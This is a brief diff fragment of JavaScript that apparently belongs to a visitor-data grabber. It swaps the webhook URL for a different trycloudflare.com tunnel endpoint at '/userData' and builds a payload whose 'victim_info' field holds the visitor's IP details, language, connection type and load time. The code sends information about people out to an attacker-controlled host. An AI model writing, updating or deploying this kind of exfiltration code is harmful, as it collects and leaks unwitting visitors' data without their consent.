@@ -84,7 +84,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-                const webhookURL = "https://insulin-mortality-happening-hb.trycloudflare.com/userData";
+                const webhookURL = "https://gbp-certainly-progress-reload.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
